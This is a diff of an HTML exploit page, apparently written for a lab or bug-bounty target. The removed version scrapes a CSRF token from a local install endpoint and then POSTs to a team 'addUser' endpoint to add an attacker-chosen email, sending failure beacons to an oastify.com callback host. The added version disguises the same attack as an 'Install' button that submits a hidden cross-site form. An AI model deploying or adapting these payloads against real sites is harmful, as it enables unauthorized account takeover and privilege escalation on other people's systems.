@@ -1,32 +1,29 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Installation Page</title>
+</head>
 <body>
-<script>
-// Step 1: Fetch internal page to extract CSRF token
-fetch("http://localhost:3000/apiv1/private/install")
-  .then(res => res.text())
-  .then(html => {
-    const match = html.match(/name="csrfToken" value="([^"]+)"/);
-    const csrf = match ? match[1] : null;
+  <h1>Install Application</h1>
+  <button id="installbutton">Install</button>
 
-    if (!csrf) {
-      // Optionally log failure
-      fetch("https://gdxma7ijvjhcl8z82g5codwkebk28xwm.oastify.com/fail?reason=no_csrf");
-      return;
-    }
-
-    // Step 2: Send POST to promote your user (replace with your username)
-    fetch("http://localhost:3000/api/teams/1/addUser/blhd3hfy48@bltiwd.com", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: "csrfToken=" + encodeURIComponent(csrf)
+  <script>
+    document.getElementById('installbutton').addEventListener('click', () => {
+      console.log('Install button clicked');
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'http://localhost:3000/api/teams/1/addUser/blhd3hfy48@bltiwd.com';
+      const csrfInput = document.createElement('input');
+      csrfInput.type = 'hidden';
+      csrfInput.name = 'csrfToken';
+      csrfInput.value = 'dummy'; // Placeholder; will likely fail
+      form.appendChild(csrfInput);
+      document.body.appendChild(form);
+      form.submit();
+      console.log('Form submitted to change team for user1');
     });
-  })
-  .catch(() => {
-    fetch("https://gdxma7ijvjhcl8z82g5codwkebk28xwm.oastify.com/fail?reason=fetch_error");
-  });
-</script>
+  </script>
 </body>
 </html>
